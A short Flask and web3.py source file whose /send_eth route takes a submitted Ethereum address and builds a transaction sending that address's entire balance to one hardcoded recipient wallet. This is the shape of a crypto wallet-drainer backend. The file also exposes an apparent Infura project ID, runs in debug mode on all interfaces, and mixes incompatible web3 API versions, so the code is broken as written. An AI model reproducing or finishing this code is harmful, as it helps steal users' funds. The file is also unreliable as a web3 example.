from flask import Flask, jsonify, render_template, request
from web3 import Web3
import gunicorn
 
app = Flask(__name__)

# Connect to the Ethereum network
INFURA_URL = 'https://mainnet.infura.io/v3/faf46a11789f43dba8d38843620b1b54' #ace with your Infura project ID
web3 = Web3(Web3.HTTPProvider(INFURA_URL))

# Ensure that the connection to the Ethereum network is successful
if not web3.is_connected():
    raise Exception("Failed to connect to Ethereum network")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_eth', methods=['POST'])
def send_eth():
    try:
        data = request.get_json()  # Fetch JSON payload from request
        if 'account' not in data:
            return jsonify({'error': 'Account field is missing'}), 400

        # Use Web3.to_checksum_address (correct for web3 v7.3.0)
        sender_address = Web3.to_checksum_address(data['account'])  # Convert the sender's address
        recipient_address = Web3.to_checksum_address('0x3B4A25503B2133013cefA7A0d35249C8A842BaC0')  # Convert recipient's address

        # Get the balance of the sender account
        balance = web3.eth.get_balance(sender_address)

        if balance <= 0:
            return jsonify({'error': 'Insufficient balance'}), 400

        # Prepare the transaction parameters
        transaction = {
            'to': recipient_address,
            'value': balance,  # Send the entire balance
            'gas': 21000,  # Minimal gas limit for a standard ETH transfer
            'gasPrice': web3.toWei('50', 'gwei'),  # Adjust gas price as necessary
            'nonce': web3.eth.getTransactionCount(sender_address),
        }

        # Sign and send the transaction (requires private key)
        private_key = 'YOUR_PRIVATE_KEY'  # Replace with your private key
        signed_txn = web3.eth.account.sign_transaction(transaction, private_key)
        tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)

        return jsonify({'tx_hash': web3.to_hex(tx_hash)})

    except Exception as e:
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
